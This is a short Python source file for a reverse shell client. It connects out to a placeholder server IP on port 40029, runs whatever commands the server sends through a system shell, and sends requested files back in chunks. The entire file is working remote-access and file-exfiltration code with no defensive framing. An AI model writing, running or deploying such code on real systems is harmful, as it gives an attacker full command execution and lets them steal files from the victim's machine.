import subprocess,socket,os

s=socket.socket()

class reverse_shell_client:
    def __init__(self):
        try:
            s.connect(('<ADD SERVER IP>', 40029))
        except:
            print("reconnecting!!")

    def change_dir(self, new_path):
        try:
            os.chdir(new_path)
            return f"Changed directory to: {os.getcwd()}"
        except OSError as e:
            return f"Error changing directory: {str(e)}"

    def controlled_exec(self, command):
        try:
            cmd = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
            output_byte = cmd.stdout.read() + cmd.stderr.read()
            output_str = str(output_byte, "utf-8")
            currentWD = os.getcwd() + "> "
            return output_str + currentWD
        except Exception as e:
            return "Error executing command: " + str(e)

    def console(self):
        while True:
            data = s.recv(20480).decode("utf-8")
            if data.strip().startswith('cd '):
                new_path = data[3:].strip()
                if new_path:
                    message = self.change_dir(new_path)
                else:
                    message = "Error: No directory specified"
            elif data.strip().startswith('download ') or data.strip().startswith('dl ') :
                filename = data.split(' ', 1)[1].strip()
                if os.path.isfile(filename):
                    self.download_file(filename)
                    continue
                else:
                    message = "Error: File not found"
            else:
                message = self.controlled_exec(data)
            s.send(str.encode(message))

    def download_file(self, filename):
        try:
            file_size = os.path.getsize(filename)

            s.sendall(f"FILE_SIZE:{file_size}".encode())

            with open(filename, "rb") as f:
                file_data = f.read()
                chunk_size = 4096
                start = 0

                # Send file in chunks
                while start < file_size:
                    end = min(start + chunk_size, file_size)
                    chunk = file_data[start:end]
                    status = s.recv(20480).decode("utf-8")
                    if status != "READY":
                        s.sendall(b"ABORT")
                        return
                    elif status == "READY":
                        s.sendall(chunk)
                    start = end

                s.sendall(b"EOF")
        except Exception as e:
            s.sendall(str.encode(f"Error reading file: {str(e)}"))

    def close_connection(self):
        s.close()
    def run(self):
        self.console()

reverse_shell_client().run()
